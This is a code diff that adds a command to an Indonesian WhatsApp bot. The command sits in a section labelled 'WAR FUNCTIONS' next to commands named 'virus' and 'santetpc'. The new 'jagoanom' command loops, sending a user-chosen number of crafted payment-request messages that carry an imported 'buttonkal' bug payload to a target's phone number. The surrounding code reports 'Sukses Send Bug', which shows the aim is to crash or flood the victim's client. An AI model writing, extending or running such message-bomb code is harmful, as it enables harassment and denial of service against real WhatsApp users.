@@ -46,6 +46,7 @@ const { ngazap } = require('./lib/ngazap')
 const { santedpc } = require('./lib/santedpc')
 const { buttonvirus2 } = require('./lib/buttonvirus2')
 const { virus } = require('./lib/virus')
+const { buttonkal } = require('./lib/buttonkal')
 
 //read database\\
 
@@ -411,6 +412,8 @@ return }
 				//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
 	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
 	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
+	const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
+	
 	const vien = {
 key: {
 fromMe: false, 
@@ -715,6 +718,22 @@ XeonBotInc.sendMessage(`${num}@s.whatsapp.net`, { audio: audionye, mimetype: 'au
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
+}
+break
+case 'jagoanom' : {
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Anggazyy Silently`,"body": `Selamat ${salam} kak ${pushname}`,
+mimetype: 'audio/mpeg', caption: `${buttonkal}`,
+showAdAttribution: true,
+sourceUrl: `https://wa.me/62882021734861`,
+thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
+}
+}}}}}, { quoted:doc})
+}
 }
 break
 case 'santetpc': {
